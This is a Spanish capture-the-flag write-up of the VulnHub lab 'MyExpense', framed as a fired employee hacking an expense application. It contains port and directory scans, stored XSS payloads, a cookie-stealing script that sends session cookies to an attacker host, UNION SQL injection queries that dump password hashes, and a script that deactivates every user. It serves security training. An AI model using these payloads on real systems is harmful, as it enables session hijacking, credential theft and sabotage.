
MyExpense

![Pasted image 20240312120222](https://github.com/JoseVazquez101/Writteups/assets/111292579/d46fb080-d5a5-42ed-bcac-39eb29bb4308)

***
- Source: https://www.vulnhub.com/entry/myexpense-1,405/
- OS: Linux
- Dificultad: Easy
- IP: DHCP
- Temas: `XSS`, `cookie hijacking`, `SQL injection`
***
***
#### Escenario:

- Usted es "Samuel Lamotte" y acaba de ser despedido de su empresa "Furtura Business Informatique". 
- Lamentablemente, debido a su salida apresurada, no tuvo tiempo de validar su informe de gastos de su último viaje de negocios, que todavía asciende a 750 € correspondientes a un vuelo de regreso a su último cliente. 
- Temiendo que su antiguo empleador no quiera reembolsarle este informe de gastos, decide piratear la aplicación interna llamada "MyExpense " para gestionar los informes de gastos de los empleados. 
- Así estarás en tu coche, en el aparcamiento de la empresa y conectado a la red Wi-Fi interna (la contraseña aún no ha sido cambiada después de tu salida). 
- La aplicación está protegida mediante autenticación de nombre de usuario:contraseña y espera que el administrador aún no haya modificado o eliminado su acceso. 
- Tus credenciales eran: ``samuel:fzghn4lw``.
- Una vez finalizado el desafío, la bandera se mostrará en la aplicación mientras esté conectado con su cuenta (samuel).

***
- Escaneo de puertos:

~~~bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 192.168.17.156
[sudo] contraseña para kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 13:45 EDT
NSE: Loaded 46 scripts for scanning.
Initiating ARP Ping Scan at 13:45
Scanning 192.168.17.156 [1 port]
Completed ARP Ping Scan at 13:45, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:45
Scanning 192.168.17.156 [65535 ports]
Discovered open port 80/tcp on 192.168.17.156
Discovered open port 33403/tcp on 192.168.17.156
Discovered open port 35967/tcp on 192.168.17.156
Discovered open port 55321/tcp on 192.168.17.156
Discovered open port 39767/tcp on 192.168.17.156
Completed SYN Stealth Scan at 13:45, 1.30s elapsed (65535 total ports)
Initiating Service scan at 13:45
Scanning 5 services on 192.168.17.156
Completed Service scan at 13:45, 6.05s elapsed (5 services on 1 host)
NSE: Script scanning 192.168.17.156.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:45
Completed NSE at 13:45, 0.03s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:45
Completed NSE at 13:45, 0.02s elapsed
Nmap scan report for 192.168.17.156
Host is up, received arp-response (0.000066s latency).
Scanned at 2024-03-12 13:45:08 EDT for 8s
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
~~~

- Fuzzing de directorios sobre el servicio web del puerto 80:

~~~bash
❯ gobuster dir -u http://192.168.17.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --add-slash --no-error -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.17.156
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/icons/               (Status: 403) [Size: 279]
/admin/               (Status: 403) [Size: 1630]
/css/                 (Status: 403) [Size: 1630]
/includes/            (Status: 403) [Size: 1630]
/config/              (Status: 403) [Size: 1630]
/fonts/               (Status: 403) [Size: 1630]
/img/                 (Status: 403) [Size: 1630]
/server-status/       (Status: 403) [Size: 1630]
Progress: 220563 / 220564 (100.00%)
===============================================================
Finished
===============================================================
~~~

- Enumeración del directorio `/admin/`:

~~~bash
❯ gobuster dir -u http://192.168.17.156/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --add-slash --no-error -k -x php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.17.156/admin
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php/                (Status: 403) [Size: 1630]
/admin.php/           (Status: 200) [Size: 13853]
/.php/                (Status: 403) [Size: 1630]
Progress: 661689 / 661692 (100.00%)
===============================================================
Finished
===============================================================
~~~

- Archivo `admin.php`:

![Pasted image 20240312122704](https://github.com/JoseVazquez101/Writteups/assets/111292579/5b3ef56c-11fb-4348-a0c3-2ef959a43a4a)

- Intenté activar mi cuenta para loguearme con las credenciales `slamotte:fzghn4lw`, pero me apareció esto:

![Pasted image 20240312224812](https://github.com/JoseVazquez101/Writteups/assets/111292579/7accd025-8749-4eb8-bb75-3efc53c6c902)

- Vemos que la url `http://192.168.17.146/admin/admin.php?id=11&status=active` al parecer intenta autenticar al usuario pero por obvias razones no tenemos permisos para esto.
- Intenté mejor crear un usuario, pero el botón para registro estaba bloqueado:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/7e464143-2e2a-467f-a9ab-7747f985c121)

- HTML no nos detendrá, así que inspeccionamos el elemento y eliminamos las restricción.
- Eliminamos `disabled=""`:

![Pasted image 20240312231139](https://github.com/JoseVazquez101/Writteups/assets/111292579/52c2a573-c854-452e-89f3-63ad4904a05f)

- Así podemos crear a nuestro usuario.
- Ahora bien, el problema es que cuando intentemos iniciar sesión, el usuario se bloqueará automáticamente.
- Creé otro usuario con el siguiente Firstname, para ver si así es posible cargar código JavaScript:

~~~javascript
<script>alert("XSS!!!");</script>
~~~

- Y en efecto, es posible:

![Pasted image 20240312232235](https://github.com/JoseVazquez101/Writteups/assets/111292579/8bb3e550-2cd2-45f3-bb00-6b2fb3271c9d)

- Ahora bien, podríamos intentar cargar una instrucción que robe la session cookie de un usuario que constantemente monitoreé los páneles.
- Tendríamos que crear un user con un Firstname que quedase de la siguiente manera:

~~~javascript
<script src="http://192.168.17.128/rubberCookie.js"></script>
~~~

- Y debemos montar en un server de Python, un script `rubberCookie.js` que tenga las siguientes instrucciones:

~~~javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.17.128/?cookie=' + document.cookie);
request.send();
~~~

- Una vez hecho esto, pasando no más de un minuto nos debería llegar una cookie de sesión:

~~~bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.17.146 - - [13/Mar/2024 01:45:41] "GET /rubberCookie.js HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 01:45:41] "GET /?cookie=PHPSESSID=ljs500bsvfe4ulgoanctj7viq6 HTTP/1.1" 200 -
~~~

- De aquí podríamos simplemente añadir esta cookie y autorizar a nuestro usuario.
- De una vez adelanto que esto no servirá, porque la página no permite a dos administradores logueados a la vez.

- Otra forma de hacerlo es poner a un usuario cuyo Firstname sea una redirección al link que nos debería permitir autorizar a este usuario:

~~~javascript
<script src="http://192.168.17.146/admin/admin.php?id=11&status=active"></script>
~~~

- De esta forma, deberíamos ver a nuestro usuario activo.
- Y así mismo, deberíamos ser capaces de iniciar sesión con nuestras credenciales:

![Pasted image 20240312235701](https://github.com/JoseVazquez101/Writteups/assets/111292579/a70cc8d4-ac29-4c88-8d2c-c5c8e1c2e2c9)

- Si nos dirigimos a `http://192.168.17.146/expense_reports.php` podremos ver el reporte por el cual nunca nos pagaron:

![Pasted image 20240312235913](https://github.com/JoseVazquez101/Writteups/assets/111292579/59c4f201-157e-4fc6-9bc0-ee9831ffa7c1)

- Podemos subir el reporte con el botón verde.
- El reporte se ha subido, pero no aceptado, lo cual es un problema porque aún no podemos cobrar por el.
- Si analizamos más, podemos ver que tenemos un mannager, probablemente el es quien acepta las solicitudes subidas, su username es `mriviere` según el panel de usuarios:

![Pasted image 20240313000202](https://github.com/JoseVazquez101/Writteups/assets/111292579/cbd5f419-afdb-403a-bbaf-eb11f88beb50)

- Aquí podemos aplicar un `cookie hijacking` de tal manera que le robaremos la sesión a nuestro mannager.
- Hay un apartado de chats donde justamente hay conversaciones con este usuario.
- Ahora bien, primero subiremos un comentario que contendrá una redirección en segundo plano a un archivo montado en nuestra máquina de atacante:

~~~javascript
<script src="http://192.168.17.128/rubberCookie.js"></script>
~~~

- Y el contenido de este recurso será el siguiente, nos mostrará la cookie del usuario en cuestión:

~~~javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.17.128/?cookie=' + document.cookie);
request.send();
~~~

- Al abrir mi server en Python, me llegaron demasiadas cookies.
- Tras probarlas todas, finalmente dí con la del usuario que buscábamos:

~~~bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.17.146 - - [13/Mar/2024 02:10:03] "GET /rubberCookie.js HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:03] "GET /?cookie=PHPSESSID=88f09hs9pqgt1i9qhk00mijds6 HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:03] "GET /?cookie=PHPSESSID=88f09hs9pqgt1i9qhk00mijds6 HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:05] "GET /rubberCookie.js HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:05] "GET /?cookie=PHPSESSID=tqqeic08l2abhlvq4ug1u31r94 HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:05] "GET /?cookie=PHPSESSID=tqqeic08l2abhlvq4ug1u31r94 HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:18] "GET /?cookie=PHPSESSID=ljs500bsvfe4ulgoanctj7viq6 HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:18] "GET /?cookie=PHPSESSID=ljs500bsvfe4ulgoanctj7viq6 HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:23] "GET /?cookie=PHPSESSID=88f09hs9pqgt1i9qhk00mijds6 HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:23] "GET /?cookie=PHPSESSID=88f09hs9pqgt1i9qhk00mijds6 HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:24] "GET /rubberCookie.js HTTP/1.1" 200 -
192.168.17.146 - - [13/Mar/2024 02:10:24] "GET /?cookie=PHPSESSID=kust032h08ddllflibc4t817m4 HTTP/1.1" 200 -
~~~

- En mi caso, la correcta fue `kust032h08ddllflibc4t817m4`.
- Y finalmente podemos validar la transacción:

![Pasted image 20240313001456](https://github.com/JoseVazquez101/Writteups/assets/111292579/da08a0ff-bc14-452c-8bb4-3b673c47ea7e)

- Ahora bien, hay un rol más y es el de `Financial Aproover`, este lo tiene un usuario que aparece en el chat llamado `Paul	Baudouin (pbaudouin)`.
- Aquí intenté extraer la cookie de este usuario sin éxito alguno.
- Me dí cuenta de que la url `http://192.168.17.146/site.php?id=2` es vulnerable a inyección SQL, así que tal vez podemos dumpear esta manualmente.
- Somos capaces de listar la base de datos con un `union select 1,2,3,database()`:

![Pasted image 20240313003006](https://github.com/JoseVazquez101/Writteups/assets/111292579/8470b568-aa10-43ec-acb1-f218cd9e3b34)

- De igual forma, podemos enumerar las tablas:

~~~mysql
union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema = 'myexpense'
~~~

![Pasted image 20240313003312](https://github.com/JoseVazquez101/Writteups/assets/111292579/b0cadf11-7780-4db4-a9ad-db71b313d2bb)

- Enumeramos columnas:

~~~mysql
- union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema = 'myexpense' and table_name = 'user'
~~~

![Pasted image 20240313003524](https://github.com/JoseVazquez101/Writteups/assets/111292579/dcc87023-4bab-4fbf-9a37-8cddc3116f3f)

- Y finalmente, usuarios y contraseñas:

~~~mysql
union select 1,2,3,group_concat(username,'%3A',password) from user where username = 'pbaudouin'
~~~

![Pasted image 20240313003914](https://github.com/JoseVazquez101/Writteups/assets/111292579/86eec570-72e2-42d6-9345-df078f74d2a8)

- Tenemos credenciales `pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a`.
- Usé [crackstation](https://crackstation.net/) y obtuve el resultado del hash (``HackMe``).
 
- Y así, finalmente podemos cobrarnos lo que nos debían:

![Pasted image 20240313004617](https://github.com/JoseVazquez101/Writteups/assets/111292579/1c02b7ed-5cb1-4e4a-aba1-7972d1dd62d1)

- Si nos logueamos de nuevo como `slamotte` podremos ver un mensaje con una Flag:

![Pasted image 20240313004931](https://github.com/JoseVazquez101/Writteups/assets/111292579/99e5f115-bc7b-4118-afa4-8aed86be411f)

- Solo por venganza, modifiqué el archivo `rubberCookie.js` y le puse esto:

~~~javascript
for (var id = 14; id >= 0; id--) {
    var request = new XMLHttpRequest();
    var url = "http://192.168.17.146/admin/admin.php?id=" + id + "&status=inactive";
    request.open('GET', url);
    request.send();
}
~~~

- Levanté un server en Python y cuando mi recurso se llamó, ocurrío la tragedia...

![Pasted image 20240313005729](https://github.com/JoseVazquez101/Writteups/assets/111292579/9cbf7d9a-cede-4de1-a4e8-8a410d72d173)

- Desactivamos a todos los usuarios, y por fin podemos descansar en paz.
- Este es el final de la máquina, en realidad me pareció bastante divertida y perfecta para repasar conceptos básicos de hacking web.
